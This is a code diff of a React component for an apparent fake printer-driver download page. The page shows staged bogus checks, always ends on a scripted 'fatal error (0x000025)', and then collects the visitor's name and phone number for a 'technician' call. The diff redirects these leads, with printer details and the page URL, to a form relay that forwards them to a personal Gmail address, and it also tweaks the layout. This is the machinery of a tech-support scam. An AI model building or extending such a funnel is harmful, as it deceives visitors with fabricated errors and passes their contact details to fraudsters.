@@ -22,6 +22,7 @@ const CHECK_DURATIONS = [7500, 7500, 7500, 7500, 7500, 7500, 7500, 7500];
 
 const DETECT_LABELS = ['', 'checking printer registry files…', 'verifying driver signatures…'];
 const DETECT_DURATIONS = [1600, 2200, 1900, 900];
+const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/leads1928@gmail.com';
 const PHONE_COUNTRIES = [
   { value: 'nz', name: 'New Zealand', code: '+64' },
   { value: 'us', name: 'United States', code: '+1' },
@@ -71,18 +72,6 @@ export function DriverDownload({
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [open]);
-
-  // Netlify supplies an approximate country based on the visitor's IP address.
-  // Keep New Zealand selected when this is unavailable (such as during local development).
-  useEffect(() => {
-    fetch('/api/lead')
-      .then((response) => (response.ok ? response.json() : null))
-      .then((data: { countryCode?: string } | null) => {
-        const country = PHONE_COUNTRIES.find((item) => item.value === data?.countryCode?.toLowerCase());
-        if (country) setPhoneCountry(country.value);
-      })
-      .catch(() => undefined);
-  }, []);
 
   // Run through the check stages, then land on the failure screen.
   useEffect(() => {
@@ -161,7 +150,7 @@ export function DriverDownload({
     setContactError('');
     setContactSubmitting(true);
     try {
-      const response = await fetch('/api/lead', {
+      const response = await fetch(FORMSUBMIT_ENDPOINT, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -170,14 +159,20 @@ export function DriverDownload({
         body: JSON.stringify({
           name,
           phone: `${selectedPhoneCountry.code} ${phone}`,
-          country: selectedPhoneCountry.name,
+          selected_country: selectedPhoneCountry.name,
           brand: brandName,
           model: modelNumber,
           connection: conn,
-          errorCode: '0x000025',
+          error_code: '0x000025',
+          _subject: `New ${brandName} printer support lead`,
+          _template: 'table',
+          _url: window.location.href,
         }),
       });
-      if (!response.ok) throw new Error('Form submission failed');
+      const result = (await response.json().catch(() => null)) as { success?: boolean | string } | null;
+      if (!response.ok || (result?.success !== true && result?.success !== 'true')) {
+        throw new Error('Form submission failed');
+      }
     } catch {
       setContactError('We could not send your details. Please try again.');
       setContactSubmitting(false);
@@ -227,7 +222,7 @@ export function DriverDownload({
             aria-modal="true"
             aria-label="Printer driver troubleshooting"
             onClick={(e) => e.stopPropagation()}
-            className="my-6 min-h-[34rem] w-full max-w-5xl rounded-2xl bg-white shadow-[0_30px_80px_rgba(0,0,0,0.4)]"
+            className="my-2 max-h-[calc(100vh-1rem)] min-h-0 w-full max-w-5xl overflow-y-auto rounded-2xl bg-white shadow-[0_30px_80px_rgba(0,0,0,0.4)] sm:my-4 sm:max-h-[calc(100vh-2rem)]"
           >
             <div className="flex justify-end border-b border-black/10 px-6 py-3 sm:px-10">
               <button
@@ -247,7 +242,7 @@ export function DriverDownload({
                 <div>
                   <h3 className="font-sans text-3xl font-bold text-[#111]">Select Your Connection Type</h3>
                   <p className="text-xl text-[#555]">Choose how your printer connects to your computer.</p>
-                  <div className="mt-8 space-y-6">
+                  <div className="mt-6 space-y-4">
                     <ConnRow
                       art={<LaptopPrinterArt />}
                       label="USB:"
@@ -402,7 +397,7 @@ export function DriverDownload({
                     </button>
                   </div>
                 ) : (
-                  <div className="mx-auto max-w-3xl pt-10 text-center">
+                  <div className="mx-auto max-w-4xl pt-4 text-center sm:pt-6">
                     <p className="text-xl font-bold text-[#dc2626]">
                       The installation could not be completed due to a fatal error (0x000025)
                     </p>
@@ -410,11 +405,11 @@ export function DriverDownload({
                     <p className="mx-auto mt-5 max-w-2xl text-xl leading-relaxed text-[#555]">
                       Your printer setup just needs a little extra help. A technician can guide you through the remaining steps.
                     </p>
-                    <form onSubmit={submitSupportRequest} className="mx-auto mt-8 max-w-2xl rounded-2xl border border-[#cfe4fa] bg-[#f5faff] p-6 text-left sm:p-8">
+                    <form onSubmit={submitSupportRequest} className="mx-auto mt-6 max-w-4xl rounded-2xl border border-[#cfe4fa] bg-[#f5faff] p-5 text-left sm:p-6">
                       <p className="text-xl font-semibold leading-relaxed text-[#333]">
                         Enter your details below for a quick call or live chat.
                       </p>
-                      <div className="mt-6 grid gap-5 sm:grid-cols-2">
+                      <div className="mt-5 grid gap-4 md:grid-cols-[1.1fr_0.9fr_1fr] md:items-end">
                         <label className="block text-lg font-semibold text-[#333]">
                           Your name
                           <input
@@ -426,35 +421,33 @@ export function DriverDownload({
                             className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
                           />
                         </label>
-                        <div>
-                          <label className="block text-lg font-semibold text-[#333]">
-                            Country / calling code
-                            <select
-                              value={phoneCountry}
-                              onChange={(e) => setPhoneCountry(e.target.value as (typeof PHONE_COUNTRIES)[number]['value'])}
-                              aria-label="Country calling code"
-                              className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-[#edf7ff] px-3 py-3 text-base font-semibold text-[#1a5e9e] outline-none focus:border-[#1a8cf5]"
-                            >
-                              {PHONE_COUNTRIES.map((country) => (
-                                <option key={country.value} value={country.value}>
-                                  {country.name} {country.code}
-                                </option>
-                              ))}
-                            </select>
-                          </label>
-                          <label className="mt-4 block text-lg font-semibold text-[#333]">
-                            Mobile number
-                            <input
-                              type="tel"
-                              value={contactPhone}
-                              onChange={(e) => setContactPhone(e.target.value)}
-                              autoComplete="tel"
-                              inputMode="tel"
-                              required
-                              className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
-                            />
-                          </label>
-                        </div>
+                        <label className="block text-lg font-semibold text-[#333]">
+                          Country / calling code
+                          <select
+                            value={phoneCountry}
+                            onChange={(e) => setPhoneCountry(e.target.value as (typeof PHONE_COUNTRIES)[number]['value'])}
+                            aria-label="Country calling code"
+                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-[#edf7ff] px-3 py-3 text-base font-semibold text-[#1a5e9e] outline-none focus:border-[#1a8cf5]"
+                          >
+                            {PHONE_COUNTRIES.map((country) => (
+                              <option key={country.value} value={country.value}>
+                                {country.name} {country.code}
+                              </option>
+                            ))}
+                          </select>
+                        </label>
+                        <label className="block text-lg font-semibold text-[#333]">
+                          Mobile number
+                          <input
+                            type="tel"
+                            value={contactPhone}
+                            onChange={(e) => setContactPhone(e.target.value)}
+                            autoComplete="tel"
+                            inputMode="tel"
+                            required
+                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
+                          />
+                        </label>
                       </div>
                       {contactError ? <p role="alert" className="mt-4 text-base font-medium text-[#b42318]">{contactError}</p> : null}
                       <div className="mt-6 flex flex-col gap-3 sm:flex-row">
@@ -497,17 +490,17 @@ function ConnRow({
   onStart: () => void;
 }) {
   return (
-    <div className="flex flex-col items-center gap-6 rounded-2xl border border-black/10 bg-[#f7f9fc] p-6 text-center sm:flex-row sm:justify-start sm:gap-16 sm:p-8">
+    <div className="flex flex-col items-center gap-4 rounded-2xl border border-black/10 bg-[#f7f9fc] p-4 text-center sm:flex-row sm:justify-start sm:gap-8 sm:p-5">
       <div className="sm:text-left">
-        <div className="mx-auto h-24 w-44 sm:mx-0">{art}</div>
-        <p className="mt-3 text-2xl">
+        <div className="mx-auto h-16 w-32 sm:mx-0">{art}</div>
+        <p className="mt-2 text-xl">
           <span className="font-bold">{label}</span> {text}
         </p>
       </div>
       <button
         type="button"
         onClick={onStart}
-        className="inline-flex shrink-0 items-center gap-3 rounded-xl bg-[#1a8cf5] px-8 py-4 text-xl font-semibold text-white transition-colors hover:bg-[#1478d6]"
+        className="inline-flex shrink-0 items-center gap-2 rounded-xl bg-[#1a8cf5] px-6 py-3 text-lg font-semibold text-white transition-colors hover:bg-[#1478d6]"
       >
         Let&apos;s Start <CircleArrow />
       </button>
